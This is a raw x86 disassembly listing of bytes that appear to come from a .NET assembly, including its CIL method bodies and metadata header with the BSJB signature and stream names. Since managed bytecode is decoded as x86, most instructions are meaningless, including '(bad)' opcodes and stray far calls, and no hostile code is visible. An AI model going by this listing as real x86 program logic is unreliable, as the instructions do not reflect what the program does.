  40529e:	17                   	pop    %ss
  40529f:	16                   	push   %ss
  4052a0:	9c                   	pushf
  4052a1:	11 06                	adc    %eax,(%esi)
  4052a3:	18 16                	sbb    %dl,(%esi)
  4052a5:	9c                   	pushf
  4052a6:	11 06                	adc    %eax,(%esi)
  4052a8:	17                   	pop    %ss
  4052a9:	28 75 00             	sub    %dh,0x0(%ebp)
  4052ac:	00 0a                	add    %cl,(%edx)
  4052ae:	26 11 06             	adc    %eax,%es:(%esi)
  4052b1:	16                   	push   %ss
  4052b2:	90                   	nop
  4052b3:	2c 1f                	sub    $0x1f,%al
  4052b5:	11 04 16             	adc    %eax,(%esi,%edx,1)
  4052b8:	9a 28 11 00 00 0a d0 	lcall  $0xd00a,$0x1128
  4052bf:	09 00                	or     %eax,(%eax)
  4052c1:	00 1b                	add    %bl,(%ebx)
  4052c3:	28 14 00             	sub    %dl,(%eax,%eax,1)
  4052c6:	00 0a                	add    %cl,(%edx)
  4052c8:	28 14 01             	sub    %dl,(%ecx,%eax,1)
  4052cb:	00 0a                	add    %cl,(%edx)
  4052cd:	74 09                	je     0x4052d8
  4052cf:	00 00                	add    %al,(%eax)
  4052d1:	1b 10                	sbb    (%eax),%edx
  4052d3:	00 09                	add    %cl,(%ecx)
  4052d5:	14 72                	adc    $0x72,%al
  4052d7:	0e                   	push   %cs
  4052d8:	0e                   	push   %cs
  4052d9:	00 70 16             	add    %dh,0x16(%eax)
  4052dc:	8d 03                	lea    (%ebx),%eax
  4052de:	00 00                	add    %al,(%eax)
  4052e0:	01 14 14             	add    %edx,(%esp,%edx,1)
  4052e3:	14 17                	adc    $0x17,%al
  4052e5:	28 75 00             	sub    %dh,0x0(%ebp)
  4052e8:	00 0a                	add    %cl,(%edx)
  4052ea:	26 de 0f             	fimuls %es:(%edi)
  4052ed:	09 2c 0b             	or     %ebp,(%ebx,%ecx,1)
  4052f0:	09 74 2f 00          	or     %esi,0x0(%edi,%ebp,1)
  4052f4:	00 01                	add    %al,(%ecx)
  4052f6:	6f                   	outsl  %ds:(%esi),(%dx)
  4052f7:	30 00                	xor    %al,(%eax)
  4052f9:	00 0a                	add    %cl,(%edx)
  4052fb:	dc 07                	faddl  (%edi)
  4052fd:	14 72                	adc    $0x72,%al
  4052ff:	1a 0e                	sbb    (%esi),%cl
  405301:	00 70 16             	add    %dh,0x16(%eax)
  405304:	8d 03                	lea    (%ebx),%eax
  405306:	00 00                	add    %al,(%eax)
  405308:	01 14 14             	add    %edx,(%esp,%edx,1)
  40530b:	14 28                	adc    $0x28,%al
  40530d:	ac                   	lods   %ds:(%esi),%al
  40530e:	00 00                	add    %al,(%eax)
  405310:	0a 74 09 00          	or     0x0(%ecx,%ecx,1),%dh
  405314:	00 1b                	add    %bl,(%ebx)
  405316:	0a de                	or     %dh,%bl
  405318:	11 de                	adc    %ebx,%esi
  40531a:	0f 07                	sysret
  40531c:	2c 0b                	sub    $0xb,%al
  40531e:	07                   	pop    %es
  40531f:	74 2f                	je     0x405350
  405321:	00 00                	add    %al,(%eax)
  405323:	01 6f 30             	add    %ebp,0x30(%edi)
  405326:	00 00                	add    %al,(%eax)
  405328:	0a dc                	or     %ah,%bl
  40532a:	06                   	push   %es
  40532b:	2a 41 34             	sub    0x34(%ecx),%al
  40532e:	00 00                	add    %al,(%eax)
  405330:	02 00                	add    (%eax),%al
  405332:	00 00                	add    %al,(%eax)
  405334:	81 00 00 00 90 00    	addl   $0x900000,(%eax)
  40533a:	00 00                	add    %al,(%eax)
  40533c:	11 01                	adc    %eax,(%ecx)
  40533e:	00 00                	add    %al,(%eax)
  405340:	0f 00 00             	sldt   (%eax)
  405343:	00 00                	add    %al,(%eax)
  405345:	00 00                	add    %al,(%eax)
  405347:	00 02                	add    %al,(%edx)
  405349:	00 00                	add    %al,(%eax)
  40534b:	00 06                	add    %al,(%esi)
  40534d:	00 00                	add    %al,(%eax)
  40534f:	00 39                	add    %bh,(%ecx)
  405351:	01 00                	add    %eax,(%eax)
  405353:	00 3f                	add    %bh,(%edi)
  405355:	01 00                	add    %eax,(%eax)
  405357:	00 0f                	add    %cl,(%edi)
  405359:	00 00                	add    %al,(%eax)
  40535b:	00 00                	add    %al,(%eax)
  40535d:	00 00                	add    %al,(%eax)
  40535f:	00 1b                	add    %bl,(%ebx)
  405361:	30 04 00             	xor    %al,(%eax,%eax,1)
  405364:	55                   	push   %ebp
  405365:	00 00                	add    %al,(%eax)
  405367:	00 3d 00 00 11 73    	add    %bh,0x73110000
  40536d:	f3 00 00             	repz add %al,(%eax)
  405370:	0a 0a                	or     (%edx),%cl
  405372:	73 f4                	jae    0x405368
  405374:	00 00                	add    %al,(%eax)
  405376:	0a 0c 06             	or     (%esi,%eax,1),%cl
  405379:	08 7e 09             	or     %bh,0x9(%esi)
  40537c:	00 00                	add    %al,(%eax)
  40537e:	04 28                	add    $0x28,%al
  405380:	5f                   	pop    %edi
  405381:	00 00                	add    %al,(%eax)
  405383:	06                   	push   %es
  405384:	6f                   	outsl  %ds:(%esi),(%dx)
  405385:	f5                   	cmc
  405386:	00 00                	add    %al,(%eax)
  405388:	0a 6f f7             	or     -0x9(%edi),%ch
  40538b:	00 00                	add    %al,(%eax)
  40538d:	0a 06                	or     (%esi),%al
  40538f:	18 6f f8             	sbb    %ch,-0x8(%edi)
  405392:	00 00                	add    %al,(%eax)
  405394:	0a 06                	or     (%esi),%al
  405396:	6f                   	outsl  %ds:(%esi),(%dx)
  405397:	19 01                	sbb    %eax,(%ecx)
  405399:	00 0a                	add    %cl,(%edx)
  40539b:	13 04 02             	adc    (%edx,%eax,1),%eax
  40539e:	0d 11 04 09 16       	or     $0x16090411,%eax
  4053a3:	09 8e b7 6f fa 00    	or     %ecx,0xfa6fb7(%esi)
  4053a9:	00 0a                	add    %cl,(%edx)
  4053ab:	0b de                	or     %esi,%ebx
  4053ad:	11 de                	adc    %ebx,%esi
  4053af:	0f 25                	(bad)
  4053b1:	28 23                	sub    %ah,(%ebx)
  4053b3:	00 00                	add    %al,(%eax)
  4053b5:	0a 13                	or     (%ebx),%dl
  4053b7:	05 28 25 00 00       	add    $0x2528,%eax
  4053bc:	0a de                	or     %dh,%bl
  4053be:	00 07                	add    %al,(%edi)
  4053c0:	2a 00                	sub    (%eax),%al
  4053c2:	00 00                	add    %al,(%eax)
  4053c4:	01 10                	add    %edx,(%eax)
  4053c6:	00 00                	add    %al,(%eax)
  4053c8:	00 00                	add    %al,(%eax)
  4053ca:	0c 00                	or     $0x0,%al
  4053cc:	38 44 00 0f          	cmp    %al,0xf(%eax,%eax,1)
  4053d0:	26 00 00             	add    %al,%es:(%eax)
  4053d3:	01 1b                	add    %ebx,(%ebx)
  4053d5:	30 04 00             	xor    %al,(%eax,%eax,1)
  4053d8:	55                   	push   %ebp
  4053d9:	00 00                	add    %al,(%eax)
  4053db:	00 3e                	add    %bh,(%esi)
  4053dd:	00 00                	add    %al,(%eax)
  4053df:	11 73 f3             	adc    %esi,-0xd(%ebx)
  4053e2:	00 00                	add    %al,(%eax)
  4053e4:	0a 0a                	or     (%edx),%cl
  4053e6:	73 f4                	jae    0x4053dc
  4053e8:	00 00                	add    %al,(%eax)
  4053ea:	0a 0c 06             	or     (%esi,%eax,1),%cl
  4053ed:	08 7e 09             	or     %bh,0x9(%esi)
  4053f0:	00 00                	add    %al,(%eax)
  4053f2:	04 28                	add    $0x28,%al
  4053f4:	5f                   	pop    %edi
  4053f5:	00 00                	add    %al,(%eax)
  4053f7:	06                   	push   %es
  4053f8:	6f                   	outsl  %ds:(%esi),(%dx)
  4053f9:	f5                   	cmc
  4053fa:	00 00                	add    %al,(%eax)
  4053fc:	0a 6f f7             	or     -0x9(%edi),%ch
  4053ff:	00 00                	add    %al,(%eax)
  405401:	0a 06                	or     (%esi),%al
  405403:	18 6f f8             	sbb    %ch,-0x8(%edi)
  405406:	00 00                	add    %al,(%eax)
  405408:	0a 06                	or     (%esi),%al
  40540a:	6f                   	outsl  %ds:(%esi),(%dx)
  40540b:	f9                   	stc
  40540c:	00 00                	add    %al,(%eax)
  40540e:	0a 13                	or     (%ebx),%dl
  405410:	04 02                	add    $0x2,%al
  405412:	0d 11 04 09 16       	or     $0x16090411,%eax
  405417:	09 8e b7 6f fa 00    	or     %ecx,0xfa6fb7(%esi)
  40541d:	00 0a                	add    %cl,(%edx)
  40541f:	0b de                	or     %esi,%ebx
  405421:	11 de                	adc    %ebx,%esi
  405423:	0f 25                	(bad)
  405425:	28 23                	sub    %ah,(%ebx)
  405427:	00 00                	add    %al,(%eax)
  405429:	0a 13                	or     (%ebx),%dl
  40542b:	05 28 25 00 00       	add    $0x2528,%eax
  405430:	0a de                	or     %dh,%bl
  405432:	00 07                	add    %al,(%edi)
  405434:	2a 00                	sub    (%eax),%al
  405436:	00 00                	add    %al,(%eax)
  405438:	01 10                	add    %edx,(%eax)
  40543a:	00 00                	add    %al,(%eax)
  40543c:	00 00                	add    %al,(%eax)
  40543e:	0c 00                	or     $0x0,%al
  405440:	38 44 00 0f          	cmp    %al,0xf(%eax,%eax,1)
  405444:	26 00 00             	add    %al,%es:(%eax)
  405447:	01 13                	add    %edx,(%ebx)
  405449:	30 03                	xor    %al,(%ebx)
  40544b:	00 18                	add    %bl,(%eax)
  40544d:	00 00                	add    %al,(%eax)
  40544f:	00 3f                	add    %bh,(%edi)
  405451:	00 00                	add    %al,(%eax)
  405453:	11 16                	adc    %edx,(%esi)
  405455:	7e 0e                	jle    0x405465
  405457:	00 00                	add    %al,(%eax)
  405459:	04 12                	add    $0x12,%al
  40545b:	00 73 1a             	add    %dh,0x1a(%ebx)
  40545e:	01 00                	add    %eax,(%eax)
  405460:	0a 80 30 00 00 04    	or     0x4000030(%eax),%al
  405466:	06                   	push   %es
  405467:	0b 2b                	or     (%ebx),%ebp
  405469:	00 07                	add    %al,(%edi)
  40546b:	2a 62 7e             	sub    0x7e(%edx),%ah
  40546e:	30 00                	xor    %al,(%eax)
  405470:	00 04 2c             	add    %al,(%esp,%ebp,1)
  405473:	10 7e 30             	adc    %bh,0x30(%esi)
  405476:	00 00                	add    %al,(%eax)
  405478:	04 6f                	add    $0x6f,%al
  40547a:	1b 01                	sbb    (%ecx),%eax
  40547c:	00 0a                	add    %cl,(%edx)
  40547e:	14 80                	adc    $0x80,%al
  405480:	30 00                	xor    %al,(%eax)
  405482:	00 04 2a             	add    %al,(%edx,%ebp,1)
  405485:	00 00                	add    %al,(%eax)
  405487:	00 42 53             	add    %al,0x53(%edx)
  40548a:	4a                   	dec    %edx
  40548b:	42                   	inc    %edx
  40548c:	01 00                	add    %eax,(%eax)
  40548e:	01 00                	add    %eax,(%eax)
  405490:	00 00                	add    %al,(%eax)
  405492:	00 00                	add    %al,(%eax)
  405494:	0c 00                	or     $0x0,%al
  405496:	00 00                	add    %al,(%eax)
  405498:	76 34                	jbe    0x4054ce
  40549a:	2e 30 2e             	xor    %ch,%cs:(%esi)
  40549d:	33 30                	xor    (%eax),%esi
  40549f:	33 31                	xor    (%ecx),%esi
  4054a1:	39 00                	cmp    %eax,(%eax)
  4054a3:	00 00                	add    %al,(%eax)
  4054a5:	00 05 00 6c 00 00    	add    %al,0x6c00
  4054ab:	00 78 1a             	add    %bh,0x1a(%eax)
  4054ae:	00 00                	add    %al,(%eax)
  4054b0:	23 7e 00             	and    0x0(%esi),%edi
  4054b3:	00 e4                	add    %ah,%ah
  4054b5:	1a 00                	sbb    (%eax),%al
  4054b7:	00 28                	add    %ch,(%eax)
  4054b9:	1d 00 00 23 53       	sbb    $0x53230000,%eax
  4054be:	74 72                	je     0x405532
  4054c0:	69 6e 67 73 00 00 00 	imul   $0x73,0x67(%esi),%ebp
  4054c7:	00 0c 38             	add    %cl,(%eax,%edi,1)
  4054ca:	00 00                	add    %al,(%eax)
  4054cc:	2c 0e                	sub    $0xe,%al
  4054ce:	00 00                	add    %al,(%eax)
  4054d0:	23 55 53             	and    0x53(%ebp),%edx
  4054d3:	00 38                	add    %bh,(%eax)
  4054d5:	46                   	inc    %esi
  4054d6:	00 00                	add    %al,(%eax)
  4054d8:	10 00                	adc    %al,(%eax)
  4054da:	00 00                	add    %al,(%eax)
  4054dc:	23 47 55             	and    0x55(%edi),%eax
  4054df:	49                   	dec    %ecx
  4054e0:	44                   	inc    %esp
  4054e1:	00 00                	add    %al,(%eax)
  4054e3:	00 48 46             	add    %cl,0x46(%eax)
  4054e6:	00 00                	add    %al,(%eax)
  4054e8:	2c 0a                	sub    $0xa,%al
  4054ea:	00 00                	add    %al,(%eax)
  4054ec:	23 42 6c             	and    0x6c(%edx),%eax
  4054ef:	6f                   	outsl  %ds:(%esi),(%dx)
  4054f0:	62 00                	bound  %eax,(%eax)
  4054f2:	00 00                	add    %al,(%eax)
  4054f4:	00 00                	add    %al,(%eax)
  4054f6:	00 00                	add    %al,(%eax)
  4054f8:	02 00                	add    (%eax),%al
  4054fa:	00 01                	add    %al,(%ecx)
  4054fc:	57                   	push   %edi
  4054fd:	3d a2 1d 09 0e       	cmp    $0xe091da2,%eax
  405502:	00 00                	add    %al,(%eax)
  405504:	00 fa                	add    %bh,%dl
  405506:	25 33 00 16 00       	and    $0x160033,%eax
  40550b:	00 01                	add    %al,(%ecx)
  40550d:	00 00                	add    %al,(%eax)
  40550f:	00 a5 00 00 00 13    	add    %ah,0x13000000(%ebp)
  405515:	00 00                	add    %al,(%eax)
  405517:	00 38                	add    %bh,(%eax)
  405519:	00 00                	add    %al,(%eax)
  40551b:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  40551f:	00 69 00             	add    %ch,0x0(%ecx)
  405522:	00 00                	add    %al,(%eax)
  405524:	26 01 00             	add    %eax,%es:(%eax)
  405527:	00 05 00 00 00 42    	add    %al,0x42000000
  40552d:	00 00                	add    %al,(%eax)
  40552f:	00 05 00 00 00 3f    	add    %al,0x3f000000
  405535:	00 00                	add    %al,(%eax)
  405537:	00 02                	add    %al,(%edx)
  405539:	00 00                	add    %al,(%eax)
  40553b:	00 05 00 00 00 05    	add    %al,0x5000000
  405541:	00 00                	add    %al,(%eax)
  405543:	00 04 00             	add    %al,(%eax,%eax,1)
  405546:	00 00                	add    %al,(%eax)
  405548:	0b 00                	or     (%eax),%eax
  40554a:	00 00                	add    %al,(%eax)
  40554c:	12 00                	adc    (%eax),%al
  40554e:	00 00                	add    %al,(%eax)
  405550:	01 00                	add    %eax,(%eax)
  405552:	00 00                	add    %al,(%eax)
  405554:	07                   	pop    %es
  405555:	00 00                	add    %al,(%eax)
  405557:	00 06                	add    %al,(%esi)
  405559:	00 00                	add    %al,(%eax)
  40555b:	00 03                	add    %al,(%ebx)
  40555d:	00 00                	add    %al,(%eax)
  40555f:	00 04 00             	add    %al,(%eax,%eax,1)
  405562:	00 00                	add    %al,(%eax)
  405564:	00 00                	add    %al,(%eax)
  405566:	19 1d 01 00 00 00    	sbb    %ebx,0x1
  40556c:	00 00                	add    %al,(%eax)
  40556e:	0a 00                	or     (%eax),%al
  405570:	26 01 fc             	es add %edi,%esp
  405573:	00 0a                	add    %cl,(%edx)
  405575:	00 5a 01             	add    %bl,0x1(%edx)
  405578:	3c 01                	cmp    $0x1,%al
  40557a:	06                   	push   %es
  40557b:	00 6a 01             	add    %ch,0x1(%edx)
  40557e:	63 01                	arpl   %eax,(%ecx)
  405580:	0a 00                	or     (%eax),%al
  405582:	c2 01 fc             	ret    $0xfc01
  405585:	00 06                	add    %al,(%esi)
  405587:	00 40 02             	add    %al,0x2(%eax)
  40558a:	63 01                	arpl   %eax,(%ecx)
  40558c:	0e                   	push   %cs
  40558d:	00 25 03 12 03 06    	add    %ah,0x6031203
  405593:	00 4c 03 42          	add    %cl,0x42(%ebx,%eax,1)
  405597:	03 06                	add    (%esi),%eax
  405599:	00 6d 03             	add    %ch,0x3(%ebp)
  40559c:	5c                   	pop    %esp
  40559d:	03 06                	add    (%esi),%eax
  40559f:	00 78 03             	add    %bh,0x3(%eax)
  4055a2:	5c                   	pop    %esp
  4055a3:	03 06                	add    (%esi),%eax
  4055a5:	00 00                	add    %al,(%eax)
  4055a7:	04 63                	add    $0x63,%al
  4055a9:	01 06                	add    %eax,(%esi)
  4055ab:	00 7f 04             	add    %bh,0x4(%edi)
  4055ae:	5c                   	pop    %esp
  4055af:	03 06                	add    (%esi),%eax
  4055b1:	00 36                	add    %dh,(%esi)
  4055b3:	07                   	pop    %es
  4055b4:	2a 07                	sub    (%edi),%al
  4055b6:	06                   	push   %es
  4055b7:	00 f8                	add    %bh,%al
  4055b9:	07                   	pop    %es
  4055ba:	63 01                	arpl   %eax,(%ecx)
  4055bc:	06                   	push   %es
  4055bd:	00 5e 08             	add    %bl,0x8(%esi)
  4055c0:	63 01                	arpl   %eax,(%ecx)
  4055c2:	06                   	push   %es
  4055c3:	00 e5                	add    %ah,%ch
  4055c5:	02 5c 03 06          	add    0x6(%ebx,%eax,1),%bl
  4055c9:	00 6b 09             	add    %ch,0x9(%ebx)
  4055cc:	63 01                	arpl   %eax,(%ecx)
  4055ce:	06                   	push   %es
  4055cf:	00 97 09 63 01 06    	add    %dl,0x6016309(%edi)
  4055d5:	00 fa                	add    %bh,%dl
  4055d7:	09 63 01             	or     %esp,0x1(%ebx)
  4055da:	06                   	push   %es
  4055db:	00 12                	add    %dl,(%edx)
  4055dd:	0a 63 01             	or     0x1(%ebx),%ah
  4055e0:	0e                   	push   %cs
  4055e1:	00 6a 0a             	add    %ch,0xa(%edx)
  4055e4:	54                   	push   %esp
  4055e5:	0a 0e                	or     (%esi),%cl
  4055e7:	00 83 0a 54 0a 0e    	add    %al,0xe0a540a(%ebx)
  4055ed:	00 b0 0a 98 0a 06    	add    %dh,0x60a980a(%eax)
  4055f3:	00 da                	add    %bl,%dl
  4055f5:	0a c7                	or     %bh,%al
  4055f7:	0a 0a                	or     (%edx),%cl
  4055f9:	00 19                	add    %bl,(%ecx)
  4055fb:	0b f2                	or     %edx,%esi
  4055fd:	0a 0a                	or     (%edx),%cl
  4055ff:	00 31                	add    %dh,(%ecx)
  405601:	0b 13                	or     (%ebx),%edx
  405603:	00 0e                	add    %cl,(%esi)
  405605:	00 66 0b             	add    %ah,0xb(%esi)
  405608:	49                   	dec    %ecx
  405609:	0b 06                	or     (%esi),%eax
  40560b:	00 9b 0b 7b 0b 06    	add    %bl,0x60b7b0b(%ebx)
  405611:	00 b9 0b 63 01 06    	add    %bh,0x601630b(%ecx)
  405617:	00 dd                	add    %bl,%ch
  405619:	0b 63 01             	or     0x1(%ebx),%esp
  40561c:	0a 00                	or     (%eax),%al
  40561e:	f6 0b 13             	testb  $0x13,(%ebx)
  405621:	00 06                	add    %al,(%esi)
  405623:	00 30                	add    %dh,(%eax)
  405625:	0c 11                	or     $0x11,%al
  405627:	0c 06                	or     $0x6,%al
  405629:	00 44 0c 63          	add    %al,0x63(%esp,%ecx,1)
  40562d:	01 06                	add    %eax,(%esi)
  40562f:	00 5a 0c             	add    %bl,0xc(%edx)
  405632:	7b 0b                	jnp    0x40563f
  405634:	0a 00                	or     (%eax),%al
  405636:	75 0c                	jne    0x405644
  405638:	13 00                	adc    (%eax),%eax
  40563a:	06                   	push   %es
  40563b:	00 89 0c 63 01 06    	add    %cl,0x601630c(%ecx)
  405641:	00 d2                	add    %dl,%dl
  405643:	0c c7                	or     $0xc7,%al
  405645:	0a 06                	or     (%esi),%al
  405647:	00 eb                	add    %ch,%bl
  405649:	0c c7                	or     $0xc7,%al
  40564b:	0a 06                	or     (%esi),%al
  40564d:	00 08                	add    %cl,(%eax)
  40564f:	0d 63 01 0a 00       	or     $0xa0163,%eax
  405654:	12 0d f2 0a 0a 00    	adc    0xa0af2,%cl
  40565a:	1e                   	push   %ds
  40565b:	0d f2 0a 06 00       	or     $0x60af2,%eax
  405660:	3a 0d 63 01 06 00    	cmp    0x60163,%cl
  405666:	5d                   	pop    %ebp
  405667:	0d 63 01 06 00       	or     $0x60163,%eax
  40566c:	68 0d 5c 03 0e       	push   $0xe035c0d
  405671:	00 8a 0d 7f 0d 0e    	add    %cl,0xe0d7f0d(%edx)
  405677:	00 94 0d 7f 0d 0e 00 	add    %dl,0xe0d7f(%ebp,%ecx,1)
  40567e:	be 0d 7f 0d 06       	mov    $0x60d7f0d,%esi
  405683:	00 12                	add    %dl,(%edx)
  405685:	0e                   	push   %cs
  405686:	63 01                	arpl   %eax,(%ecx)
  405688:	06                   	push   %es
  405689:	00 2b                	add    %ch,(%ebx)
  40568b:	0e                   	push   %cs
  40568c:	5c                   	pop    %esp
  40568d:	03 06                	add    (%esi),%eax
  40568f:	00 3e                	add    %bh,(%esi)
  405691:	0e                   	push   %cs
  405692:	63 01                	arpl   %eax,(%ecx)
  405694:	06                   	push   %es
  405695:	00 6c 0e 5c          	add    %ch,0x5c(%esi,%ecx,1)
  405699:	03 0e                	add    (%esi),%ecx
  40569b:	00 7a 0e             	add    %bh,0xe(%edx)
  40569e:	12 03                	adc    (%ebx),%al
  4056a0:	0e                   	push   %cs
  4056a1:	00 88 0e 12 03 0e    	add    %cl,0xe03120e(%eax)
  4056a7:	00 93 0e 12 03 06    	add    %dl,0x603120e(%ebx)
  4056ad:	00 a0 0e 63 01 0e    	add    %ah,0xe01630e(%eax)
  4056b3:	00 e0                	add    %ah,%al
  4056b5:	0e                   	push   %cs
  4056b6:	12 03                	adc    (%ebx),%al
  4056b8:	06                   	push   %es
  4056b9:	00 ec                	add    %ch,%ah
  4056bb:	0e                   	push   %cs
  4056bc:	5c                   	pop    %esp
  4056bd:	03 0a                	add    (%edx),%ecx
  4056bf:	00 00                	add    %al,(%eax)
  4056c1:	0f 3c                	(bad)
  4056c3:	01 06                	add    %eax,(%esi)
  4056c5:	00 31                	add    %dh,(%ecx)
  4056c7:	0f 63 01             	packsswb (%ecx),%mm0
  4056ca:	06                   	push   %es
  4056cb:	00 7a 0f             	add    %bh,0xf(%edx)
  4056ce:	63 01                	arpl   %eax,(%ecx)
  4056d0:	06                   	push   %es
  4056d1:	00 82 0f 42 03 06    	add    %al,0x603420f(%edx)
  4056d7:	00 8b 0f 63 01 06    	add    %cl,0x601630f(%ebx)
  4056dd:	00 94 0f 42 03 06 00 	add    %dl,0x60342(%edi,%ecx,1)
  4056e4:	b5 0f                	mov    $0xf,%ch
  4056e6:	42                   	inc    %edx
  4056e7:	03 0a                	add    (%edx),%ecx
  4056e9:	00 c6                	add    %al,%dh
  4056eb:	0f f2 0a             	pslld  (%edx),%mm1
  4056ee:	06                   	push   %es
  4056ef:	00 f8                	add    %bh,%al
  4056f1:	0f de 0f             	pmaxub (%edi),%mm1
  4056f4:	06                   	push   %es
  4056f5:	00 13                	add    %dl,(%ebx)
  4056f7:	10 de                	adc    %bl,%dh
  4056f9:	0f 06                	clts
  4056fb:	00 24 10             	add    %ah,(%eax,%edx,1)
  4056fe:	de 0f                	fimuls (%edi)
  405700:	12 00                	adc    (%eax),%al
  405702:	52                   	push   %edx
  405703:	10 40 10             	adc    %al,0x10(%eax)
  405706:	12 00                	adc    (%eax),%al
  405708:	6b 10 40             	imul   $0x40,(%eax),%edx
  40570b:	10 12                	adc    %dl,(%edx)
  40570d:	00 80 10 40 10 1b    	add    %al,0x1b104010(%eax)
  405713:	01 9b 10 00 00 12    	add    %ebx,0x12000010(%ebx)
  405719:	00 12                	add    %dl,(%edx)
  40571b:	11 40 10             	adc    %eax,0x10(%eax)
  40571e:	12 00                	adc    (%eax),%al
  405720:	1e                   	push   %ds
  405721:	11 40 10             	adc    %eax,0x10(%eax)
  405724:	0a 00                	or     (%eax),%al
  405726:	47                   	inc    %edi
  405727:	11 3c 01             	adc    %edi,(%ecx,%eax,1)
  40572a:	06                   	push   %es
  40572b:	00 77 11             	add    %dh,0x11(%edi)
  40572e:	63 01                	arpl   %eax,(%ecx)
  405730:	0a 00                	or     (%eax),%al
  405732:	7e 11                	jle    0x405745
  405734:	13 00                	adc    (%eax),%eax
  405736:	06                   	push   %es
  405737:	00 8d 11 63 01 06    	add    %cl,0x6016311(%ebp)
  40573d:	00 98 11 63 01 06    	add    %bl,0x6016311(%eax)
  405743:	00 c0                	add    %al,%al
  405745:	11 42 03             	adc    %eax,0x3(%edx)
  405748:	06                   	push   %es
  405749:	00 d7                	add    %dl,%bh
  40574b:	11 5c 03 0a          	adc    %ebx,0xa(%ebx,%eax,1)
  40574f:	00 f0                	add    %dh,%al
  405751:	11 f2                	adc    %esi,%edx
  405753:	0a 0a                	or     (%edx),%cl
  405755:	00 08                	add    %cl,(%eax)
  405757:	12 f2                	adc    %dl,%dh
  405759:	0a 06                	or     (%esi),%al
  40575b:	00 36                	add    %dh,(%esi)
  40575d:	12 5c 03 0e          	adc    0xe(%ebx,%eax,1),%bl
  405761:	00 44 12 12          	add    %al,0x12(%edx,%edx,1)
  405765:	03 06                	add    (%esi),%eax
  405767:	00 64 12 63          	add    %ah,0x63(%edx,%edx,1)
  40576b:	01 16                	add    %edx,(%esi)
  40576d:	00 cd                	add    %cl,%ch
  40576f:	12 be 12 16 00 d6    	adc    -0x29ffe9ee(%esi),%bh
  405775:	12 be 12 16 00 db    	adc    -0x24ffe9ee(%esi),%bh
  40577b:	12 be 12 16 00 e5    	adc    -0x1affe9ee(%esi),%bh
  405781:	12 be 12 0a 00 ec    	adc    -0x13fff5ee(%esi),%bh
  405787:	12 13                	adc    (%ebx),%dl
  405789:	00 0a                	add    %cl,(%edx)
  40578b:	00 f4                	add    %dh,%ah
  40578d:	12 13                	adc    (%ebx),%dl
  40578f:	00 1a                	add    %bl,(%edx)
  405791:	00 13                	add    %dl,(%ebx)
  405793:	02 02                	add    (%edx),%al
  405795:	13 0e                	adc    (%esi),%ecx
  405797:	00 1f                	add    %bl,(%edi)
  405799:	13 12                	adc    (%edx),%edx
  40579b:	03 06                	add    (%esi),%eax
  40579d:	00 37                	add    %dh,(%edi)
  40579f:	13 63 01             	adc    0x1(%ebx),%esp
  4057a2:	0e                   	push   %cs
  4057a3:	00 71 13             	add    %dh,0x13(%ecx)
  4057a6:	c7                   	(bad)
  4057a7:	0a 0a                	or     (%edx),%cl
  4057a9:	00 79 13             	add    %bh,0x13(%ecx)
  4057ac:	13 00                	adc    (%eax),%eax
  4057ae:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4057af:	00 91 13 00 00 06    	add    %dl,0x6000013(%ecx)
  4057b5:	00 ad 13 42 03 0a    	add    %ch,0xa034213(%ebp)
  4057bb:	00 f8                	add    %bh,%al
  4057bd:	13 d7                	adc    %edi,%edx
  4057bf:	13 06                	adc    (%esi),%eax
  4057c1:	00 23                	add    %ah,(%ebx)
  4057c3:	14 13                	adc    $0x13,%al
  4057c5:	14 1a                	adc    $0x1a,%al
  4057c7:	00 4c 14 02          	add    %cl,0x2(%esp,%edx,1)
  4057cb:	13 16                	adc    (%esi),%edx
  4057cd:	00 9c 14 85 14 16 00 	add    %bl,0x161485(%esp,%edx,1)
  4057d4:	a8 14                	test   $0x14,%al
  4057d6:	be 12 16 00 b8       	mov    $0xb8001612,%esi
  4057db:	14 be                	adc    $0xbe,%al
  4057dd:	12 16                	adc    (%esi),%dl
  4057df:	00 da                	add    %bl,%dl
  4057e1:	14 be                	adc    $0xbe,%al
  4057e3:	12 16                	adc    (%esi),%dl
  4057e5:	00 f1                	add    %dh,%cl
  4057e7:	14 85                	adc    $0x85,%al
  4057e9:	14 06                	adc    $0x6,%al
  4057eb:	00 2c 15 1a 15 06 00 	add    %ch,0x6151a(,%edx,1)
  4057f2:	37                   	aaa
  4057f3:	15 63 01 06 00       	adc    $0x60163,%eax
  4057f8:	53                   	push   %ebx
  4057f9:	15 1a 15 06 00       	adc    $0x6151a,%eax
  4057fe:	6a 15                	push   $0x15
  405800:	1a 15 06 00 b7 15    	sbb    0x15b70006,%dl
  405806:	63 01                	arpl   %eax,(%ecx)
  405808:	0e                   	push   %cs
  405809:	00 d9                	add    %bl,%cl
  40580b:	15 c7 0a 06 00       	adc    $0x60ac7,%eax
  405810:	25 16 0a 16 06       	and    $0x6160a16,%eax
  405815:	00 70 16             	add    %dh,0x16(%eax)
  405818:	63 01                	arpl   %eax,(%ecx)
  40581a:	1e                   	push   %ds
  40581b:	00 8f 16 83 16 06    	add    %cl,0x6168316(%edi)
  405821:	00 9a 16 0a 16 0e    	add    %bl,0xe160a16(%edx)
  405827:	00 ac 16 7f 0d 0e 00 	add    %ch,0xe0d7f(%esi,%edx,1)
  40582e:	bb 16 7f 0d 0e       	mov    $0xe0d7f16,%ebx
  405833:	00 cb                	add    %cl,%bl
  405835:	16                   	push   %ss
  405836:	7f 0d                	jg     0x405845
  405838:	0e                   	push   %cs
  405839:	00 18                	add    %bl,(%eax)
  40583b:	17                   	pop    %ss
  40583c:	7f 0d                	jg     0x40584b
  40583e:	0e                   	push   %cs
  40583f:	00 36                	add    %dh,(%esi)
  405841:	17                   	pop    %ss
  405842:	c7                   	(bad)
  405843:	0a 0e                	or     (%esi),%cl
  405845:	00 5e 17             	add    %bl,0x17(%esi)
  405848:	c7                   	(bad)
  405849:	0a 06                	or     (%esi),%al
  40584b:	00 9e 17 1a 15 06    	add    %bl,0x6151a17(%esi)
  405851:	00 a9 17 1a 15 06    	add    %ch,0x6151a17(%ecx)
  405857:	00 c5                	add    %al,%ch
  405859:	17                   	pop    %ss
  40585a:	2a 07                	sub    (%edi),%al
  40585c:	06                   	push   %es
  40585d:	00 e0                	add    %ah,%al
  40585f:	17                   	pop    %ss
  405860:	11 0c 06             	adc    %ecx,(%esi,%eax,1)
  405863:	00 00                	add    %al,(%eax)
  405865:	18 11                	sbb    %dl,(%ecx)
  405867:	0c 06                	or     $0x6,%al
  405869:	00 13                	add    %dl,(%ebx)
